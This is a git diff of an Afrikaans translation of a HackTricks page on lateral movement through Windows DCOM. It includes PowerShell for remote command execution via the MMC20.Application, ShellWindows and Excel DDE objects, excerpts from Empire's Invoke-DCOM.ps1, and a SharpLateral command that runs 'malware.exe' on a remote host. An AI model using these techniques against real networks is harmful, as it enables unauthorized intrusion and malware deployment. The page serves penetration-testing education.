@@ -1,36 +1,29 @@
-# DCOM Uitvoering
+# DCOM Uitvoer
 
 <details>
 
 <summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks af in PDF-formaat**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Werk jy in 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou hacktruuks deur PR's in te dien by die** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)..
+* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud)..
 
 </details>
-
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Vind kwesbaarhede wat die belangrikste is sodat jy dit vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
 
 ## MMC20.Application
 
 **Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike pos vanaf [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
 
-Verspreide Komponentobjekmodel (DCOM) objekte bied 'n interessante vermoë vir netwerkgebaseerde interaksies met objekte. Microsoft bied omvattende dokumentasie vir beide DCOM en Komponentobjekmodel (COM), toeganklik [hier vir DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) en [hier vir COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). 'n Lys van DCOM-toepassings kan verkry word deur die PowerShell-opdrag te gebruik:
+
+Verspreide Komponentobjekmodel (DCOM) objekte bied 'n interessante vermoë vir netwerkgebaseerde interaksies met objekte. Microsoft bied omvattende dokumentasie vir beide DCOM en Komponentobjekmodel (COM), toeganklik [hier vir DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) en [hier vir COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). 'n Lys van DCOM-toepassings kan verkry word deur die PowerShell-opdrag:
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-Die COM-object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), maak dit moontlik om MMC snap-in operasies te skryf. Merkwaardig, hierdie object bevat 'n `ExecuteShellCommand` metode onder `Document.ActiveView`. Meer inligting oor hierdie metode kan [hier](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx) gevind word. Voer dit uit deur die volgende te hardloop:
+Die COM-object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), maak skryf van MMC snap-in operasies moontlik. Merkwaardig genoeg bevat hierdie objek 'n `ExecuteShellCommand` metode onder `Document.ActiveView`. Meer inligting oor hierdie metode kan [hier](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx) gevind word. Kontroleer dit deur dit uit te voer:
 
-Hierdie funksie maak dit moontlik om opdragte oor 'n netwerk uit te voer deur middel van 'n DCOM-toepassing. Om as 'n admin met DCOM op afstand te kommunikeer, kan PowerShell as volg gebruik word:
+Hierdie kenmerk fasiliteer die uitvoer van bevele oor 'n netwerk deur 'n DCOM-toepassing. Om vanaf 'n afstand met DCOM te kan interageer as 'n admin, kan PowerShell as volg gebruik word:
 ```powershell
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
@@ -41,7 +34,7 @@ Kyk na metodes:
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
-Kry RCE (Remote Code Execution):
+Kry RCE:
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com | Get-Member
@@ -54,12 +47,12 @@ ls \\10.10.10.10\c$\Users
 
 **Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike pos [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
 
-Die **MMC20.Application**-voorwerp is geïdentifiseer as 'n voorwerp wat eksplisiete "LaunchPermissions" ontbreek en standaard toestemmings toelaat vir Administrateurs. Vir verdere besonderhede kan 'n draad ondersoek word [hier](https://twitter.com/tiraniddo/status/817532039771525120), en die gebruik van [@tiraniddo](https://twitter.com/tiraniddo) se OleView .NET vir die filter van voorwerpe sonder eksplisiete Launch Permission word aanbeveel.
+Die **MMC20.Application**-voorwerp is geïdentifiseer as 'n gebrek aan uitdruklike "LaunchPermissions," wat standaard na toestemmings wat Administrateurs toegang verleen, oorskakel. Vir verdere besonderhede kan 'n draad ondersoek word [hier](https://twitter.com/tiraniddo/status/817532039771525120), en die gebruik van [@tiraniddo](https://twitter.com/tiraniddo) se OleView .NET vir die filter van voorwerpe sonder uitdruklike Launch Permission word aanbeveel.
 
-Twee spesifieke voorwerpe, `ShellBrowserWindow` en `ShellWindows`, is uitgelig as gevolg van hul gebrek aan eksplisiete Launch Permissions. Die afwesigheid van 'n `LaunchPermission`-registerinskrywing onder `HKCR:\AppID\{guid}` dui op geen eksplisiete toestemmings nie.
+Twee spesifieke voorwerpe, `ShellBrowserWindow` en `ShellWindows`, is uitgelig weens hul gebrek aan uitdruklike Launch Permissions. Die afwesigheid van 'n `LaunchPermission`-registerinskrywing onder `HKCR:\AppID\{guid}` dui op geen uitdruklike toestemmings nie.
 
 ###  ShellWindows
-Vir `ShellWindows`, wat 'n ProgID ontbreek, fasiliteer die .NET-metodes `Type.GetTypeFromCLSID` en `Activator.CreateInstance` die instansiasie van die voorwerp deur gebruik te maak van sy AppID. Hierdie proses maak gebruik van OleView .NET om die CLSID vir `ShellWindows` te bekom. Sodra dit geïnstantieer is, is interaksie moontlik deur die `WindowsShell.Item`-metode, wat lei tot metode-aanroeping soos `Document.Application.ShellExecute`.
+Vir `ShellWindows`, wat 'n ProgID ontbreek, fasiliteer die .NET-metodes `Type.GetTypeFromCLSID` en `Activator.CreateInstance` voorwerpinstansiasie deur sy AppID te gebruik. Hierdie proses maak gebruik van OleView .NET om die CLSID vir `ShellWindows` te herwin. Eenmaal geïnstantieer, is interaksie moontlik deur die `WindowsShell.Item`-metode, wat tot metode-aanroeping soos `Document.Application.ShellExecute` lei.
 
 Voorbeeld PowerShell-opdragte is verskaf om die voorwerp te instansieer en op afstand opdragte uit te voer:
 ```powershell
@@ -70,9 +63,9 @@ $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\sy
 ```
 ### Laterale Beweging met Excel DCOM-voorwerpe
 
-Laterale beweging kan bereik word deur DCOM Excel-voorwerpe uit te buit. Vir gedetailleerde inligting is dit raadsaam om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM te lees by [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
+Laterale beweging kan bereik word deur DCOM Excel-voorwerpe te benut. Vir gedetailleerde inligting, is dit raadsaam om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM te lees by [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
 
-Die Empire-projek bied 'n PowerShell-skripsie wat die gebruik van Excel demonstreer vir afstandsbeheeruitvoering (RCE) deur DCOM-voorwerpe te manipuleer. Hieronder is uittreksels uit die skripsie wat beskikbaar is op [Empire se GitHub-opberging](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes toon om Excel te misbruik vir RCE:
+Die Empire-projek bied 'n PowerShell-skripsie wat die gebruik van Excel vir afgeleë kode-uitvoering (RCE) demonstreer deur DCOM-voorwerpe te manipuleer. Hieronder is uittreksels uit die skripsie beskikbaar op [Empire se GitHub-opberging](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes toon om Excel vir RCE te misbruik:
 ```powershell
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
@@ -95,19 +88,19 @@ $Obj.DisplayAlerts = $false
 $Obj.DDEInitiate("cmd", "/c $Command")
 }
 ```
-### Outomatiese Hulpmiddels vir Laterale Beweging
+### Outomatiese Gereedskap vir Laterale Beweging
 
-Daar word twee hulpmiddels uitgelig vir die outomatiseering van hierdie tegnieke:
+Twee gereedskappe word uitgelig vir die outomatiseering van hierdie tegnieke:
 
-- **Invoke-DCOM.ps1**: 'n PowerShell-skrips wat deur die Empire-projek voorsien word en die aanroeping van verskillende metodes vir die uitvoering van kode op afgeleë masjiene vereenvoudig. Hierdie skrips is beskikbaar by die Empire GitHub-opberging.
+- **Invoke-DCOM.ps1**: 'n PowerShell-skrip wat deur die Empire-projek voorsien word en wat die aanroeping van verskillende metodes vir die uitvoering van kode op afgeleë rekenaars vereenvoudig. Hierdie skrip is toeganklik by die Empire GitHub-opgaarplek.
 
-- **SharpLateral**: 'n Hulpmiddel wat ontwerp is vir die uitvoering van kode op afstand, wat gebruik kan word met die opdrag:
+- **SharpLateral**: 'n gereedskap wat ontwerp is vir die afgeleë uitvoering van kode, wat gebruik kan word met die bevel:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
 ## Outomatiese Gereedskap
 
-* Die Powershell-skripsie [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) maak dit maklik om alle gekommentarieerde maniere om kode in ander masjiene uit te voer, aan te roep.
+* Die Powershell-skrip [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) maak dit maklik om alle uitgekommentariseerde maniere om kode op ander rekenaars uit te voer, aan te roep.
 * Jy kan ook [**SharpLateral**](https://github.com/mertdas/SharpLateral) gebruik:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
@@ -117,22 +110,16 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 * [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 * [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
 
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Vind kwesbaarhede wat die belangrikste is sodat jy dit vinniger kan regstel. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
 <details>
 
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 
 
 </details>
